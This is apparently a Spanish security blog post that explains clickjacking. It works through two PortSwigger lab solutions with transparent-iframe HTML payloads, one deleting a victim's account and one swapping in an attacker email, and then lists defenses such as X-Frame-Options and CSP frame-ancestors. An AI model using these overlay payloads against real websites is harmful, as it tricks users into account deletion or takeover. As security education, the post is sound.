---
layout: post
title: ¿Qué es el Clickjacking?
description: Una explicación sobre el clickjacking con algunos ejemplos. 
tags: [ clickjacking , seguridad , portswigger, BurpSuite ]
---

# Indice
1. [Introducción](#introduction)

2. [¿De qué se trata?](#que)

3. [Ejemplo práctico #1](#lab1)

4. [Ejemplo práctico #2](#lab2)

5. [Cómo evitar el Clickjacking](#evitar)

6. [Cómo evitar el Clickjacking](#recursos)

# Introducción<a id="introduction"></a>
 
El otro día, realizando un pequeño test de reconocimiento en algunas webs con la herramienta [blue eye](https://github.com/BullsEye0/blue_eye) se me cruzó varias veces el término `clickjacking`. No era la primera vez que lo había visto, pero no tenía muy claro a qué se referiá exactamente y cuál era la diferencia con el `CSRF`. 

Así que decidí indagar un poco, y descubrí que este tipo de ataques han sido utilizado contra páginas como Twitter y Facebook, consiguiendo que las víctimas hagan likes de manera inconsciente o retuitearan contenido sin saberlo. Así que sin más, voy a tratar de explicar de qué se trata. 


# ¿De qué se trata?<a id="que"></a>

Imaginemos que visitamos una página afectada por un clickjacking, ya que hemos recibido un enlace en nuestro mail o alguien nos la ha pasado por Whatsapp. La página nos pedirá que hagamos click en algún botón y el simple hecho de haber hecho ese click ejecuta una acción maliciosa ( por ejemplo, nos roba las credenciales). La diferencia con el CSRF es básicamente que el usuario tiene que realizar una acción ( un click en un botón, por ejemplo). 

Generalmente los ataques de CSRF se protegen mediante un token: un token de sesión único y específico. Pero ¿qué ocurre si encima de una página normal con su token de sesión se despliega una capa con un botón? Que podemos ejecutar un ataque de clickjacking. Por tanto, cabe destacar que para hacer este tipo de ataques hay que modificar la hoja de estilos, añadiendo un `<iframe>`. Un ejemplo sería el siguiente:

````
<head>
	<style>
		#web_atacada {
			position:relative;
			width:128px;
			height:128px;
			opacity:0.00001;
			z-index:2;
			}

		#web_maliciosa {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>
...
<body>
	<div id="web_maliciosa">
	{{ Contenido malicioso }}
	</div>
	<iframe id="web_atacada" src="https://vulnerable-website.com">
	</iframe>
</body>
````

# Ejemplo práctico #1 <a id="lab1"></a>

Una vez más voy a tirar de los [Labs de Portswigger](https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected) que son tremendamente útiles y comprensibles para estos casos.

Empiezo con un lab básico: `Basic Clickjacking with CSRF token protection` en el que hay una página con un token CSRF. Para resolver el lab, hay que manipular el HTML de la página y engañar a un posible usuario para que borre su cuenta. 

Nuestras credenciales son: wiener:peter. 


Entro en la parte privada de la página con las credenciales y observo que en `my-account` hay un formulario con un botón "Delete Account" que hace un POST a "/my-account-delete" y lo hace con un token CSRF. Por tanto, hay que añadir una capa con un botón ( o un div que diga Click me en este caso ) para que la víctima borre su cuenta. Para ello, hay que ir a "Go to Exploit Server" y meter esto en la parte de Body:


````
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index: 1;
        width: 100px;
       height: 20px;
       color: black;
    }

</style>
<div>
   Click me
</div>
<iframe src="https://.....web-security-academy.net/my-account"></iframe>

````

NOTA: En esta parte me he vuelto un poco loco con el CSS. Yo jugaba con las propiedades `width` y `height` con atributos de `100vw` y `100vh`. Pero hay que hacerlo con valores similares a los indicados (500px y 700px), de lo contrario el exploit no funciona.


En mi caso queda perfectamente ajustado con esos atributos en Google Chrome, pero es posible que haya que afinar un poco. Una vez ajustado, le damos a `Store` y luego `Deliver Exploit to Victim`.


# Ejemplo práctico #2 <a id="lab2"></a>

El siguiente ejemplo es parecido al anterior. Se trata de cambiar el email del usuario en este caso, en lugar de borrar el correo, tenemos que conseguir reemplazarlo por otro. 

Arranco Burpusite ya que en esta ocasión no se trata sólo de hacer un click, sino de ver qué ocurre cuando cambiamos el mail y qué es lo que mandamos en nuestra petición.

Me meto con mi usuario Wiener y contraseña Peter. Podemos ver que hay un formulario. Si inspeccionamos el código vemos que el nombre del input es `email`, así que podemos usar la técnica de inyectar parámetros en la url para rellenar campos de un formulario, tal y como explican en este [enlace](https://docs.machform.com/help/using-url-parameters-to-populate-form-fields).

Por lo demás, el código es prácticamente el mismo, añadiendo como ya he dicho el parámetro `email` a la url:


````
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:60px;
        z-index: 1;
        width: 100px;
       height: 20px;
       color: black;
    }

</style>
<div>
   Click me
</div>
<iframe src="https://....web-security-academy.net/my-account?email=emailnuevo@attacker.com"></iframe>

````

# Cómo evitar el Clickjacking <a id="evitar"></a>

Como siempre, la [web de OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) nos da varias soluciones para atajar este ataque. Primeramente, habría que añadir un header HTTP de tipo `X-Frame-Options` en el que se especifique el valor `DENY` ( a no ser que haya que por alguna razón tengamos que permitirlo, en ese caso `SAMEORIGIN` o bien `ALLOW-FROM`uri). IMPORTANTE: Habrá que especificar este header como HTTP Response Header. Si lo hacemos mediante un meta-tag (ejemplo `<meta http-equiv="X-Frame-Options" content="deny">`), no funcionará y podemos ser víctimas de un clickjacking.

La segunda opción sería utilizar Content-Security-Policy (CSP) con el atributo frame-ancestors. Por ejemplo `Content-Security-Policy: frame-ancestors 'none';`. Esta directiva se añade al HTTP response header para indicarle al navegador si puede mostrar una página dentro de un `<frame>` o un `<iframe>`.  Lo malo de este método es que no todos los navegadores soportan esta opción.

Otra opción es utilizar el atributo `SameSite` en nuestras Cookies, algo que ya se utiliza para prevenir ataques de Cross-Site Request Forgery pero que pueden ayudar en el Clickjacking también.

# Recursos <a id="recursos"></a>

 - https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html

 - https://www.invicti.com/blog/web-security/clickjacking-attacks/

 - https://book.hacktricks.xyz/pentesting-web/clickjacking


